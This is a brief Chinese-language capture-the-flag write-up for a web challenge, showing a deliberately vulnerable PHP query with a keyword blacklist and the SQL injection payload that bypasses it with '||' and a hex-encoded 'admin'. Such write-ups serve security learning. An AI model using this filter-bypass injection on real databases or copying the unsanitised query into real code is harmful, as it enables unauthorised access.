# old-49_300

* 這一題一進去就有一個斗大的標題 sql injection 以及 source code 
    ```php=
    if($_GET['lv']){
        $db = dbconnect();
        if(preg_match("/select|or|and|\(|\)|limit|,|\/|order|cash| |\t|\'|\"/i",$_GET['lv'])) exit("no hack");
        $result = mysqli_fetch_array(mysqli_query($db,"select id from chall49 where lv={$_GET['lv']}"));
        echo $result[0] ;
        if($result[0]=="admin") solve(49);
      }
    ```
    只要 id = admin 就過了，當然 lv 經過了一點過濾
* 再經過縝密的思考之後，得出了這一個 payload `0||id=0x61646d696e`
* 送出之後就過拉
